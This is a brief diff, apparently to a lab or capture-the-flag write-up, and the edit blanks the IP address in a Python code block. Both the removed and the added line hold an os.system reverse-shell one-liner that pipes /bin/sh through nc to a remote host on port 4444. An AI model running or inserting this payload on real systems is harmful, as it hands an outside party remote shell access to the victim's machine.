@@ -202,5 +202,5 @@ Ruvik ...
 ```
 import os
 
-os.system("mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg")
+os.system("mkfifo /tmp/kirxhbg; nc  4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg")
 ```
